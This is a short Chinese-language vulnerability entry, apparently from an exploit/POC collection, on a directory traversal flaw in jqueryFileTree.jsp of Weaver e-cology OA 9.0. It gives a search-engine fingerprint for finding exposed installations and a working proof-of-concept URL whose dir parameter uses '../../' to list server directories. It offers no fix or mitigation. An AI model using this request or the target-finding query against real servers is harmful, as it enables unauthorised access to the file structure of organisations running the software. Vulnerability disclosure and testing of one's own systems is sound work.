# 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞

## 漏洞描述

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中  jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息

## 漏洞影响

<a-checkbox checked>泛微e-cology 9.0</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="泛微-协同办公OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1636962061131-2d870e8d-e15c-4864-8d36-69bd1f57d746-2361681.png)

验证POC

```php
/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
```

![img](../../../.vuepress/public/img/1662361654117-6a9aece5-41fe-40de-a608-c3be49eb5a48.png)